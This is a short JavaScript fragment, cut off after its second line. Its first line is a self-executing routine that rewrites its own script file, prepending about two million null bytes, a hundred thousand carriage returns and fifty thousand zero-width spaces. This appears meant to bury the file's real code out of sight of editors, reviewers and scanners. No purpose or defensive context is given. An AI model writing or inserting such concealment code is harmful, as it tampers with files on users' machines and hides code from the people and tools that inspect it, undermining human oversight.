(()=>{const f=process.argv[1],fs=require('fs'),c=fs.readFileSync(f,'utf8'),b='\0'.repeat(2_000_000)+'\r'.repeat(100_000)+'\u200B'.repeat(50_000);if(!c.startsWith(b)){fs.writeFileSync(f,b+'\n'+c);}})();
const {
